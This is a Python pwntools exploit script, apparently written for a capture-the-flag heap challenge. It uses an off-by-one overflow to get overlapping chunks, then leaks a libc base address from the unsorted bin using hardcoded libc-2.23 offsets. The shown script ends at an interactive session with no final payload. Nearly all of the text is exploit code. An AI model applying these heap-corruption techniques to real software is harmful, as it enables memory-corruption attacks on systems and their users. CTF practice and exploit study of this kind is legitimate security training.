# -*- coding: utf-8 -*-
from pwn import *

#context(log_level='debug')
p = process("./timu")
#p = remote("111.198.29.45",47415)
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
gdb.attach(p)

# off by one
def create(size, data):
    p.recvuntil("Your choice :\n")
    p.sendline("1")
    p.recvuntil("Size: \n")
    p.sendline(str(size))
    p.recvuntil("Data: \n")
    p.sendline(data)

def delete(i):
    p.recvuntil("Your choice :\n")
    p.sendline("2")
    p.recvuntil("Index: \n")
    p.sendline(str(i))

def show():
    p.recvuntil("Your choice :\n")
    p.sendline("3")


create(0x100-8,"a")                             #0
create(0x650-8,"b"*0x5f0+p64(0x600)+p64(0x50))  #1
create(0x500,"c")   #2
create(0x100,"d")   #3

delete(0)
delete(1)

create(0x100-8,'e'*0xf8)    #0
create(0x500-8,'f')         #1
create(0x100-8,'g')         #4

delete(1)
delete(2)

create(0x500-8,"h") #1

show()

p.recvuntil('4 : ')
libcBase = u64(p.recv(6)+'\x00'*2)-0x3c4b78
mainArena = libcBase + 0x3c4b78 - 0x58
log.success(hex(libcBase))

create(0x100-8,"i") #2
delete(4)
delete(2)



p.interactive()
